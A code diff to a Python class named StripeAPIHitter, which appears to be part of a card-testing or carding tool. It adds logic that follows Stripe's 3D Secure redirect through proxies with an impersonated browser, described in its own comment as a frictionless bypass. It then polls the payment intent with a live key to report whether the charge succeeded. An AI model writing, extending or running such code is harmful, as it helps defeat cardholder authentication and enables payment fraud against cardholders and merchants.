@@ -757,6 +757,29 @@ class StripeAPIHitter:
                                         result['decline_code'] = '3d_secure_auth_failed'
                                         result['error'] = str(auth_json)[:500]
                                         return result
+                                        
+                            elif next_action.get('type') == 'redirect_to_url':
+                                redirect_url = next_action.get('redirect_to_url', {}).get('url')
+                                return_url = next_action.get('redirect_to_url', {}).get('return_url')
+                                
+                                if redirect_url:
+                                    # Attempt frictionless bypass by hitting the hooks URL with our impersonated browser
+                                    hook_res = await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                    
+                                    # Poll the Intent to see if frictionless succeeded
+                                    poll_url = f"https://api.stripe.com/v1/setup_intents/{intent_id}?key={self.pk_live}" if is_setup_intent else f"https://api.stripe.com/v1/payment_intents/{intent_id}?key={self.pk_live}"
+                                    poll_res = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                    poll_json = poll_res.json()
+                                    poll_status = poll_json.get('status')
+                                    
+                                    if poll_status in ['succeeded', 'requires_capture', 'complete']:
+                                        result['success'] = True
+                                        result['final_url'] = return_url or redirect_url
+                                        return result
+                                        
+                                    result['decline_code'] = '3d_secure_required_hard'
+                                    result['final_url'] = return_url or redirect_url
+                                    return result
                         except Exception as ex:
                             print(f"DEBUG: 3DS Frictionless bypass failed: {ex}")
                             pass
